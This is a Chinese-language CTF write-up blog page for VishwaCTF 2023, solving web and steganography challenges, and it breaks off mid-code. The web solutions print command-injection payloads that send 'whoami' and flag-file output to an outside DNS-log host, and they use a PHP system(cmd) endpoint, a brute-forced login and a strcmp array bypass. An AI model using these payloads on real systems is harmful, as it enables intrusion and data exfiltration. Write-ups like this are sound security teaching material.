@@ -1,0 +1,291 @@
+<!DOCTYPE html><html lang="en"> <head><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>VishwaCTF 2023 Writeup</title><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><meta name="generator" content="Astro v5.9.0"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/vishwactf-2023/"><title>VishwaCTF 2023 Writeup
+
+
+
+<!-- Open Graph / Facebook -->
+
+
+
+
+
+<!-- Twitter -->
+
+
+
+</title><meta name="title" content="VishwaCTF 2023 Writeup"><meta name="description" content><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/vishwactf-2023/"><meta property="og:title" content="VishwaCTF 2023 Writeup"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/vishwactf-2023/"><meta property="twitter:title" content="VishwaCTF 2023 Writeup"><meta property="twitter:description" content><link rel="stylesheet" href="/_astro/_slug_.D2NkKxuK.css">
+<link rel="stylesheet" href="/_astro/waline.nkDt9Ep-.css">
+<link rel="stylesheet" href="/_astro/_slug_.D48ksWp2.css">
+<link rel="stylesheet" href="/_astro/_slug_.DEy1TFvp.css">
+<style>#waline[data-astro-cid-cjuph4ok]{margin:2rem 0}
+</style></head> <!-- Global Metadata --> <!-- Font preloads --> <!-- Canonical URL --> <!-- Primary Meta Tags --> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const a=document.getElementById("article");if(a){const n=a.getElementsByTagName("img");Array.from(n).forEach(e=>{const t=document.createElement("a");t.setAttribute("data-fancybox","gallery"),t.href=e.src,e.parentNode?.insertBefore(t,e),t.appendChild(e)})}});</script></head> <body class="bg-white"> <header class="relative m-0 px-4 py-4 mb-8" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" data-astro-cid-3ef6ksr2> <!-- 桌面端导航 --> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <!-- 移动端菜单按钮 --> <button id="menu-btn" class="md:hidden flex flex-col space-y-1 p-2 text-black" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <!-- 移动端下拉菜单 --> <div id="menu" class="md:hidden absolute top-full left-0 w-full bg-white dark:bg-gray-900 shadow-lg border-t dark:border-gray-700 hidden" data-astro-cid-3ef6ksr2> <div class="flex flex-col py-2" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),t=document.getElementById("menu");e?.addEventListener("click",()=>{t?.classList.toggle("hidden"),e.classList.toggle("open")});document.addEventListener("click",n=>{!e?.contains(n.target)&&!t?.contains(n.target)&&(t?.classList.add("hidden"),e?.classList.remove("open"))});</script>  <main class="min-h-screen"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 mb-6 tracking-tight leading-tight"> VishwaCTF 2023 Writeup </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2023-04-03T14:22:32.000Z" class="text-[#86868b] tracking-wide"> <time datetime="2023-04-03T14:22:32.000Z"> Apr 3, 2023 </time> </time> <span class="text-[#d2d2d7] flex items-center">|</span>
+							
+							<div class="flex items-center"> <span class="flex items-center"> <a href="/categories/技术/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> 技术 </a>  </span> </div>  <span class="text-[#d2d2d7] flex items-center">|</span> <div class="flex items-center"> <span class="flex items-center"> <a href="/tags/CTF/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> CTF </a> <span class="text-[#d2d2d7] mx-2">·</span> </span><span class="flex items-center"> <a href="/tags/Writeup/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> Writeup </a> <span class="text-[#d2d2d7] mx-2">·</span> </span><span class="flex items-center"> <a href="/tags/网络安全/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> 网络安全 </a>  </span> </div>  </div> </header>  <nav class="toc" data-astro-cid-woz2nwfv> <h2 class="toc-title" data-astro-cid-woz2nwfv>目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#写在前面" class="toc-link" data-astro-cid-woz2nwfv> 1. 写在前面 </a>  </li><li data-astro-cid-woz2nwfv> <a href="#web" class="toc-link" data-astro-cid-woz2nwfv> 2. Web </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#spooky" class="toc-link" data-astro-cid-woz2nwfv> 2.1. spooky </a> </li><li data-astro-cid-woz2nwfv> <a href="#mascot" class="toc-link" data-astro-cid-woz2nwfv> 2.2. Mascot </a> </li><li data-astro-cid-woz2nwfv> <a href="#alive" class="toc-link" data-astro-cid-woz2nwfv> 2.3. aLive </a> </li><li data-astro-cid-woz2nwfv> <a href="#eeezzy" class="toc-link" data-astro-cid-woz2nwfv> 2.4. Eeezzy </a> </li><li data-astro-cid-woz2nwfv> <a href="#payload" class="toc-link" data-astro-cid-woz2nwfv> 2.5. Payload </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#steganography" class="toc-link" data-astro-cid-woz2nwfv> 3. Steganography </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#can-you-see-me" class="toc-link" data-astro-cid-woz2nwfv> 3.1. Can you see me? </a> </li><li data-astro-cid-woz2nwfv> <a href="#guatemala" class="toc-link" data-astro-cid-woz2nwfv> 3.2. Guatemala </a> </li><li data-astro-cid-woz2nwfv> <a href="#just-files" class="toc-link" data-astro-cid-woz2nwfv> 3.3. Just Files </a> </li><li data-astro-cid-woz2nwfv> <a href="#i-love-you" class="toc-link" data-astro-cid-woz2nwfv> 3.4. I Love You </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#forensics" class="toc-link" data-astro-cid-woz2nwfv> 4. Forensics </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#the-sender-conundrum" class="toc-link" data-astro-cid-woz2nwfv> 4.1. The Sender Conundrum </a> </li><li data-astro-cid-woz2nwfv> <a href="#1nj3ct0r" class="toc-link" data-astro-cid-woz2nwfv> 4.2. 1nj3ct0r </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#cryptography" class="toc-link" data-astro-cid-woz2nwfv> 5. Cryptography </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#the-indecipherable-cipher" class="toc-link" data-astro-cid-woz2nwfv> 5.1. The Indecipherable Cipher </a> </li> </ol> </li> </ol> </nav>  <script type="module">document.querySelectorAll(".toc-link").forEach(o=>{o.addEventListener("click",t=>{t.preventDefault();const e=o.getAttribute("href")?.slice(1);if(e){const i=document.getElementById(e);if(i){const c=i.getBoundingClientRect().top+window.pageYOffset-100;window.scrollTo({top:c,behavior:"smooth"})}}})});const s=new IntersectionObserver(o=>{const t=o.filter(e=>e.isIntersecting);if(t.length>0){const i=t.reduce((n,c)=>n.boundingClientRect.top<c.boundingClientRect.top?n:c).target.id;document.querySelectorAll(".toc-link.active").forEach(n=>n.classList.remove("active"));const r=document.querySelector(`.toc-link[href="#${i}"]`);r&&r.classList.add("active")}},{rootMargin:"-10% 0px -70% 0px",threshold:[0,.5,1]});document.querySelectorAll(".toc-link").forEach(o=>{const t=o.getAttribute("href")?.slice(1);if(t){const e=document.getElementById(t);e&&s.observe(e)}});</script>  <div class="fancybox-container">  <div id="article" class="prose prose-lg max-w-none">   <h2 id="写在前面">写在前面</h2>
+<p>怎么说呢… 感觉这比赛有些许神经质…套路确实不同于以前打的CTF<!--more--></p>
+<h2 id="web">Web</h2>
+<h3 id="spooky">spooky</h3>
+<blockquote>
+<p>I forgot my login credentials again!!</p>
+</blockquote>
+<p>目录扫描发现存在 <code>/sitemap.xml</code> 文件，访问后给出了用户名列表和密码列表</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="xml"><code><span class="line"><span style="color:#E1E4E8">&#x3C;?</span><span style="color:#85E89D">xml</span><span style="color:#B392F0"> version</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"1.0"</span><span style="color:#B392F0"> encoding</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"UTF-8"</span><span style="color:#E1E4E8">?></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">urlset</span><span style="color:#B392F0"> xmlns</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"http://www.sitemaps.org/schemas/sitemap/0.9"</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">url</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">	&#x3C;</span><span style="color:#85E89D">loc</span><span style="color:#E1E4E8">>/creds/users.txt&#x3C;/</span><span style="color:#85E89D">loc</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">	&#x3C;</span><span style="color:#85E89D">lastmod</span><span style="color:#E1E4E8">>2023-03-29T09:12:48+01:00&#x3C;/</span><span style="color:#85E89D">lastmod</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">	&#x3C;</span><span style="color:#85E89D">priority</span><span style="color:#E1E4E8">>1.0&#x3C;/</span><span style="color:#85E89D">priority</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">url</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">url</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">	&#x3C;</span><span style="color:#85E89D">loc</span><span style="color:#E1E4E8">>/creds/pass.txt&#x3C;/</span><span style="color:#85E89D">loc</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">	&#x3C;</span><span style="color:#85E89D">lastmod</span><span style="color:#E1E4E8">>2023-03-29T09:12:48+01:00&#x3C;/</span><span style="color:#85E89D">lastmod</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">	&#x3C;</span><span style="color:#85E89D">priority</span><span style="color:#E1E4E8">>1.0&#x3C;/</span><span style="color:#85E89D">priority</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">url</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">urlset</span><span style="color:#E1E4E8">></span></span></code></pre>
+<p>直接使用 Burp 爆破得到正确的账号密码</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>user=shrekop</span></span>
+<span class="line"><span>pass=VmU5gnXKYN2vLp48</span></span></code></pre>
+<p>这题比较神经质，一开始以为爆出来正确的账号密码就行了，后来才发现貌似需要想办法提升到管理员用户，想了很久最后在登录的时候添加 <code>&#x26;admin=true</code> 得到 flag</p>
+<h3 id="mascot">Mascot</h3>
+<blockquote>
+<p>Very gracious host!!</p>
+</blockquote>
+<p>目录扫描发发现存在 <code>.git</code> 泄露，使用 GitHack 进行利用发现脱不下来，但是返回的文件名内有个 <code>FLAGGGGG.md</code> 直接访问得到 flag</p>
+<h3 id="alive">aLive</h3>
+<blockquote>
+<p>In my college level project I created this website that tells us if any domain/ip is active or not. But there is a catch.</p>
+</blockquote>
+<p>通过 Dnslog 进行测试发现可以 RCE，可能是国外比赛的问题，使用国内Dnslog平台无法接收到数据</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#F97583">POST</span><span style="color:#E1E4E8"> / HTTP/2</span></span>
+<span class="line"><span style="color:#85E89D">Host</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> ch431021116114.ch.eng.run</span></span>
+<span class="line"><span style="color:#85E89D">Content-Length</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 37</span></span>
+<span class="line"><span style="color:#85E89D">Cache-Control</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> max-age=0</span></span>
+<span class="line"><span style="color:#85E89D">Sec-Ch-Ua</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> " Not A;Brand";v="99", "Chromium";v="90"</span></span>
+<span class="line"><span style="color:#85E89D">Sec-Ch-Ua-Mobile</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> ?0</span></span>
+<span class="line"><span style="color:#85E89D">Upgrade-Insecure-Requests</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 1</span></span>
+<span class="line"><span style="color:#85E89D">Origin</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> https://ch431021116114.ch.eng.run</span></span>
+<span class="line"><span style="color:#85E89D">Content-Type</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> application/x-www-form-urlencoded</span></span>
+<span class="line"><span style="color:#85E89D">User-Agent</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span></span>
+<span class="line"><span style="color:#85E89D">Accept</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
+<span class="line"><span style="color:#85E89D">Sec-Fetch-Site</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> same-origin</span></span>
+<span class="line"><span style="color:#85E89D">Sec-Fetch-Mode</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> navigate</span></span>
+<span class="line"><span style="color:#85E89D">Sec-Fetch-User</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> ?1</span></span>
+<span class="line"><span style="color:#85E89D">Sec-Fetch-Dest</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> document</span></span>
+<span class="line"><span style="color:#85E89D">Referer</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> https://ch431021116114.ch.eng.run/</span></span>
+<span class="line"><span style="color:#85E89D">Accept-Encoding</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> gzip, deflate</span></span>
+<span class="line"><span style="color:#85E89D">Accept-Language</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> zh-CN,zh;q=0.9</span></span>
+<span class="line"><span style="color:#85E89D">Connection</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> close</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">domain=`whoami`.a23b2268.ipv6.1433.eu.org</span></span></code></pre>
+<p>经过测试发现过滤了 <code>cat</code> ，我们直接 <code>tac</code> 绕过 得到 <code>flag</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>domain=`tac f*`.a23b2268.ipv6.1433.eu.org</span></span></code></pre>
+<h3 id="eeezzy">Eeezzy</h3>
+<blockquote>
+<p>I forgot my login details again!</p>
+</blockquote>
+<p>查看网页源代码发现有个 <code>view.php</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79B8FF">    session_start</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    $_SESSION[</span><span style="color:#9ECBFF">'status'</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">=</span><span style="color:#79B8FF">null</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">    $flag</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">    try</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'username'</span><span style="color:#E1E4E8">]) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#79B8FF"> isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'password'</span><span style="color:#E1E4E8">])) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">strcmp</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'username'</span><span style="color:#E1E4E8">], $flag)</span><span style="color:#F97583">==</span><span style="color:#79B8FF">0</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#79B8FF"> strcmp</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'password'</span><span style="color:#E1E4E8">], $flag)</span><span style="color:#F97583">==</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">                $_SESSION[</span><span style="color:#9ECBFF">'status'</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$flag;</span></span>
+<span class="line"><span style="color:#F97583">            else</span></span>
+<span class="line"><span style="color:#E1E4E8">                $_SESSION[</span><span style="color:#9ECBFF">'status'</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"Invalid username or password"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">catch</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">Throwable</span><span style="color:#E1E4E8"> $th) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        $_SESSION[</span><span style="color:#9ECBFF">'status'</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$flag;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">?></span></span></code></pre>
+<p>直接数组绕过，注意一点，不能 <code>username</code> 和 <code>password</code> 均为数组，否则结果不为 <code>true</code> 会进入 <code>else</code> 语句</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>?username=admin&#x26;password[]=</span></span></code></pre>
+<h3 id="payload">Payload</h3>
+<p>访问 <code>robots.txt</code> 提到了 <code>cmd</code> 和 <code>btn</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'cmd'</span><span style="color:#E1E4E8">])){</span></span>
+<span class="line"><span style="color:#79B8FF">        system</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'cmd'</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'btn'</span><span style="color:#E1E4E8">])){</span></span>
+<span class="line"><span style="color:#79B8FF">            echo</span><span style="color:#9ECBFF"> "&#x3C;b>System Details: &#x3C;/b>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#79B8FF">            system</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"uname -a"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">?></span></span></code></pre>
+<p>当点击页面上的系统详细信息按钮时，在 <code>url</code> 中出现 <code>/?btn=</code>，直接 <code>btn</code> 改为 <code>cmd</code> 命令执行即可，注意和前面一样貌似过滤了 <code>cat</code> 直接 <code>tac </code> 命令即可。</p>
+<h2 id="steganography">Steganography</h2>
+<h3 id="can-you-see-me">Can you see me?</h3>
+<blockquote>
+<p>A magician made the seven wonders disappear. But people claim they can still feel their presence in the air.</p>
+</blockquote>
+<p>下载附件得到一张图片，在文件尾发现存在隐藏文件，直接使用 foremost 分离得到一个 wav 音频文件，听起来像噪音…直接尝试使用 Audacity 显示为频谱图得到 flag</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>vishwaCTF{n0w_y0u_533_m3}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/vishwactf-2023/image-20230403104342968.png" alt="image-20230403104342968"></p>
+<h3 id="guatemala">Guatemala</h3>
+<blockquote>
+<p>My friend wanted to install an antivirus for his computer, but the creator of the antivirus was caught!</p>
+</blockquote>
+<p>下载附件发现无后缀，观察文件头发现是 <code>GIF</code>，改后缀后未发现特别信息，通过 <code>exiftool</code> 发现一段 <code>Base64</code> 编码</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>> .\exiftool.exe D:\Downloads\Guatemala\AV</span></span>
+<span class="line"><span>ExifTool Version Number         : 12.22</span></span>
+<span class="line"><span>File Name                       : AV.gif</span></span>
+<span class="line"><span>Directory                       : D:/Downloads/Guatemala</span></span>
+<span class="line"><span>File Size                       : 1086 KiB</span></span>
+<span class="line"><span>File Modification Date/Time     : 2023:04:02 14:56:24+08:00</span></span>
+<span class="line"><span>File Access Date/Time           : 2023:04:03 10:39:47+08:00</span></span>
+<span class="line"><span>File Creation Date/Time         : 2023:04:02 14:55:58+08:00</span></span>
+<span class="line"><span>File Permissions                : -rw-rw-rw-</span></span>
+<span class="line"><span>File Type                       : GIF</span></span>
+<span class="line"><span>File Type Extension             : gif</span></span>
+<span class="line"><span>MIME Type                       : image/gif</span></span>
+<span class="line"><span>GIF Version                     : 89a</span></span>
+<span class="line"><span>Image Width                     : 498</span></span>
+<span class="line"><span>Image Height                    : 498</span></span>
+<span class="line"><span>Has Color Map                   : Yes</span></span>
+<span class="line"><span>Color Resolution Depth          : 8</span></span>
+<span class="line"><span>Bits Per Pixel                  : 8</span></span>
+<span class="line"><span>Background Color                : 0</span></span>
+<span class="line"><span>Animation Iterations            : Infinite</span></span>
+<span class="line"><span>Comment                         : dmlzaHdhQ1RGe3ByMDczYzdfdXJfM1gxRn0=</span></span>
+<span class="line"><span>Frame Count                     : 17</span></span>
+<span class="line"><span>Duration                        : 2.04 s</span></span>
+<span class="line"><span>Image Size                      : 498x498</span></span>
+<span class="line"><span>Megapixels                      : 0.248</span></span></code></pre>
+<p>解码 <code>Comment</code> 后得到 <code>flag</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>vishwaCTF{pr073c7_ur_3X1F}</span></span></code></pre>
+<h3 id="just-files">Just Files</h3>
+<blockquote>
+<p>They are not what you see. They are different. Believe me.</p>
+</blockquote>
+<p>下载附件后得到两张图片，分别是 <code>Get_It_1.jpeg</code> 和 <code>Get_It_2.png</code>，其中 <code>Get_It_2.png</code> 很大，直接使用 foremost 分离得到 <code>Its_a_Morse_not_a_joke_take_it_seriously.wav</code> 文件，前面很清楚是摩斯电码，后面很嘈杂听不懂，尝试识别莫斯电码后得到如下文本</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Reverse the audio and you should find name of protagonist. I told you the story in PNG file.</span></span></code></pre>
+<p>根据描述我们使用 PR 进行倒放音频，貌似是一个剧中的原声，不过本人英语听力不行… 使用在线音频转文本工具得到如下信息(用于没充会员可能不完整)，搜索发现对话片段来自<a href="https://www.kexiaoguo.com/meiju569/426/">路西法(2016)</a></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>She humiliated me. She oh me you're not god's Jimmy. You didn't make her you a destroyer so I'm gonna punish you if that got you freak. I mean I am not going to jail for that bitch. No chance listen into a lucifer back off told you its fine. I'm a move tool.</span></span>
+<span class="line"><span>Why did you do that? He was gonna kill you. No, no, no, no you just. You just let him off too easy and needs the pain he needs to suffer he to feel the pain, not escape it.</span></span>
+<span class="line"><span>Don't worry, I'm sure he's going the pain coming. No, it's not, actually.</span></span>
+<span class="line"><span>The.</span></span></code></pre>
+<p>所以说主角的名字是 <code>lucifer</code> 但是提交不正确，尝试 <code>Steghide</code> 解密 <code>Its_a_Morse_not_a_joke_take_it_seriously.wav</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">┌──(kali㉿kali</span><span style="color:#E1E4E8">)-[~/Desktop/_Get_It_2.png.extracted]</span></span>
+<span class="line"><span style="color:#B392F0">└─$</span><span style="color:#9ECBFF"> steghide</span><span style="color:#9ECBFF"> extract</span><span style="color:#79B8FF"> -sf</span><span style="color:#9ECBFF"> Its_a_Morse_not_a_joke_take_it_seriously.wav</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#B392F0">Enter</span><span style="color:#9ECBFF"> passphrase:</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#B392F0">wrote</span><span style="color:#9ECBFF"> extracted</span><span style="color:#9ECBFF"> data</span><span style="color:#9ECBFF"> to</span><span style="color:#9ECBFF"> "flag.txt".</span></span></code></pre>
+<p>打开 <code>flag.txt</code> 得到 flag</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Nice </span></span>
+<span class="line"><span>The flag is {the name of protagonist_S01E03}.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>name of protagonist should be in small case.</span></span></code></pre>
+<h3 id="i-love-you">I Love You</h3>
+<blockquote>
+<p>There is an audio file given below… It is not so difficult but you will find it’s sound very deep</p>
+</blockquote>
+<p>根据题目描述使用 <code>DeepSound</code> 得到 <code>welcome.exe</code></p>
+<p><img src="https://img.5ime.cn/vishwactf-2023/image-20230403115651428.png" alt="image-20230403115651428"></p>
+<p>根据图标发现 <code>welcome.exe</code>  很明显是 <code>python</code> 打包的文件，直接使用 <code>pyinstxtractor</code> 进行反编译</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>python pyinstxtractor.py .\welcome.exe</span></span></code></pre>
+<p>然后再通过在线工具反编译 <code>pyc</code> 文件得到源代码和 <code>flag</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Hey Cyber Warrior!!!'</span><span style="color:#E1E4E8">)</span></span>
